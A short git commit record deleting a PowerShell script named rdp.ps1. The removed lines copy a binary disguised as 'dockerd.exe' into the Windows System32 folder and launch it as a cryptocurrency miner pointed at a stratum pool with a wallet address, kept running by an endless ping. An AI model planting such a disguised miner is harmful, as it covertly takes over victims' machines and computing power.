3c35f25ffa3c7e1a0fa20810460a021e56408098
kijang-020 <85983742+kijang-020@users.noreply.github.com>
2021-11-12 05:40:13 +0700

    Delete rdp.ps1

--- web/rdp.ps1
+++
@@ -1,4 +0,0 @@
-Copy dockerd.exe C:\Windows\System32
-cmd /c echo cmd /k start dockerd.exe -a yespowerSUGAR -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.worker1 -t4 >>a.ps1
-cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
-.\a.ps1
